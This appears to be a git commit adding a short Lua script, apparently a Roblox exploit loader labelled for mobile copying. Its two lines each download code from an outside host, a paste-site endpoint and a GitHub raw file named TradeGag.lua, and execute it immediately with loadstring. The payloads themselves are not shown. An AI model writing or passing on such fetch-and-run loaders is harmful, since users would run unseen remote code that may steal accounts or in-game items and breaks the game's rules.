8e064a6652e5b97edd1dae20bf0d6e2b27769465
PlsNoNoob <jasperbns4@gmail.com>
2025-08-02 18:38:24 +0900

    Create GagNotOp.lua

---
+++ GagNotOp.lua
@@ -0,0 +1,4 @@
+-- For Mobile Copy:
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/3x67ehV43dPpepmh/raw", true))()
+wait(1)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/PlsNoNoob/-/refs/heads/main/TradeGag.lua'))()
